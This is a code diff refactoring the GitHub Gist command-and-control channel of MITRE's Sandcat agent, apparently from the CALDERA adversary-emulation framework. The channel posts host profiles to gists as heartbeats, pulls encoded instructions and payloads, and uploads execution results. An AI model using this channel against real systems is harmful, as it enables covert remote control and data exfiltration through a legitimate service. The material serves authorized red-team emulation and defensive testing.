@@ -2,18 +2,17 @@ package contact
 
 import (
 	"context"
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
-	"github.com/google/go-github/github"
-	"golang.org/x/oauth2"
 	"math/rand"
-	"path/filepath"
 	"strconv"
 	"time"
 
-	"github.com/mitre/sandcat/gocat/executors/execute"
-	"github.com/mitre/sandcat/gocat/output"
-	"github.com/mitre/sandcat/gocat/util"
+	"github.com/mitre/gocat/output"
+
+	"github.com/google/go-github/github"
+	"golang.org/x/oauth2"
 )
 
 const (
@@ -28,57 +27,38 @@ var (
 	username string
 )
 
-type GIST struct {}
+type GIST struct {
+	name string
+}
 
 func init() {
-	CommunicationChannels["GIST"] = GIST{}
+	CommunicationChannels["GIST"] = GIST{ name: "GIST" }
 }
 
 //GetInstructions sends a beacon and returns instructions
-func (g GIST) GetInstructions(profile map[string]interface{}) map[string]interface{} {
+func (g GIST) GetBeaconBytes(profile map[string]interface{}) []byte {
 	checkValidSleepInterval(profile)
+	var retBytes []byte
 	bites, heartbeat := gistBeacon(profile)
-	var out map[string]interface{}
 	if heartbeat == true {
-		if bites != nil {
-			var commands interface{}
-			json.Unmarshal(bites, &out)
-			json.Unmarshal([]byte(out["instructions"].(string)), &commands)
-			out["sleep"] = int(out["sleep"].(float64))
-			out["watchdog"] = int(out["watchdog"].(float64))
-			out["instructions"] = commands
-		}
+		retBytes = bites
 	}
-	return out
+	return retBytes
 }
 
 //GetPayloadBytes load payload bytes from github
-func (g GIST) GetPayloadBytes(payload string, server string, uniqueID string, platform string, writeToDisk bool) (string, []byte) {
+func (g GIST) GetPayloadBytes(profile map[string]interface{}, payload string) []byte {
 	var payloadBytes []byte
-	location := ""
-	output.VerbosePrint(fmt.Sprintf("[*] Downloading new payload bytes: %s", payload))
-	payloads := getGists("payloads", fmt.Sprintf("%s-%s", uniqueID, payload))
+	var err error
+	payloads := getGists("payloads", fmt.Sprintf("%s-%s", profile["paw"].(string), payload))
 	if payloads[0] != "" {
-		if writeToDisk {
-			location = filepath.Join(payload)
-			util.WritePayloadBytes(location, util.Decode(payloads[0]))
-		} else {
-			payloadBytes = util.Decode(payloads[0])
+		payloadBytes, err = base64.StdEncoding.DecodeString(payloads[0])
+		if err != nil {
+			output.VerbosePrint(fmt.Sprintf("[-] Failed to decode payload bytes: %s", err.Error()))
+			return nil
 		}
 	}
-	return location, payloadBytes
-}
-
-//RunInstruction runs a single instruction
-func (g GIST) RunInstruction(command map[string]interface{}, profile map[string]interface{}, payloads []string) {
-	timeout := int(command["timeout"].(float64))
-	result := make(map[string]interface{})
-	outputData, status, pid := execute.RunCommand(command["command"].(string), payloads, command["executor"].(string), timeout)
-	result["id"] = command["id"]
-	result["output"] = outputData
-	result["status"] = status
-	result["pid"] = pid
-	g.SendExecutionResults(profile, result)
+	return payloadBytes
 }
 
 //C2RequirementsMet determines if sandcat can use the selected comm channel
@@ -102,21 +82,33 @@ func (g GIST) SendExecutionResults(profile map[string]interface{}, result map[st
 	gistResults(profileCopy)
 }
 
+func (g GIST) GetName() string {
+	return g.name
+}
+
 
 func gistBeacon(profile map[string]interface{}) ([]byte, bool) {
 	heartbeat := createHeartbeatGist("beacon", profile)
 	//collect instructions & delete
 	contents := getGists("instructions", profile["paw"].(string))
 	if contents != nil {
-		return util.Decode(contents[0]), heartbeat
+		decodedContents, err := base64.StdEncoding.DecodeString(contents[0])
+		if err != nil {
+			output.VerbosePrint(fmt.Sprintf("[-] Failed to decode beacon response: %s", err.Error()))
+			return nil, heartbeat
+		}
+		return decodedContents, heartbeat
 	}
 	return nil, heartbeat
 }
 
 func createHeartbeatGist(gistType string, profile map[string]interface{}) bool {
-	data, _ := json.Marshal(profile)
-
-	if createGist(gistType, profile["paw"].(string), data) != created {
+	data, err := json.Marshal(profile)
+	if err != nil {
+		output.VerbosePrint(fmt.Sprintf("[-] Cannot create Gist heartbeat. Error with profile marshal: %s", err.Error()))
+		output.VerbosePrint("[-] Heartbeat GIST: FAILED")
+		return false
+	} else if createGist(gistType, profile["paw"].(string), data) != created {
 		output.VerbosePrint("[-] Heartbeat GIST: FAILED")
 		return false
 	}
@@ -125,8 +117,11 @@ func createHeartbeatGist(gistType string, profile map[string]interface{}) bool {
 }
 
 func gistResults(result map[string]interface{}) {
-	data, _ := json.Marshal(result)
-	if createGist("results", result["paw"].(string), data) != created {
+	data, err := json.Marshal(result)
+	if err != nil {
+		output.VerbosePrint(fmt.Sprintf("[-] Cannot create Gist results. Error with result marshal: %s", err.Error()))
+		output.VerbosePrint("[-] Results GIST: FAILED")
+	} else if createGist("results", result["paw"].(string), data) != created {
 		output.VerbosePrint("[-] Results GIST: FAILED")
 	} else {
 		output.VerbosePrint("[+] Results GIST: SUCCESS")
@@ -138,7 +133,7 @@ func createGist(gistType string, uniqueId string, data []byte) int {
 	ctx := context.Background()
 	c2Client := createNewClient()
 	gistDescriptor := getGistDescriptor(gistType, uniqueId)
-	stringified := string(util.Encode(data))
+	stringified := base64.StdEncoding.EncodeToString(data)
 	file := github.GistFile{Content: &stringified,}
 	files := make(map[github.GistFilename]github.GistFile)
 	files[github.GistFilename(gistDescriptor)] = file
@@ -178,7 +173,7 @@ func getGistDescriptor(gistType string, uniqueId string) string {
 
 func checkValidSleepInterval(profile map[string]interface{}) {
 	if profile["sleep"] == githubTimeout{
-		util.Sleep(float64(githubTimeoutResetInterval))
+		time.Sleep(time.Duration(float64(githubTimeoutResetInterval)) * time.Second)
 	}
 }
 
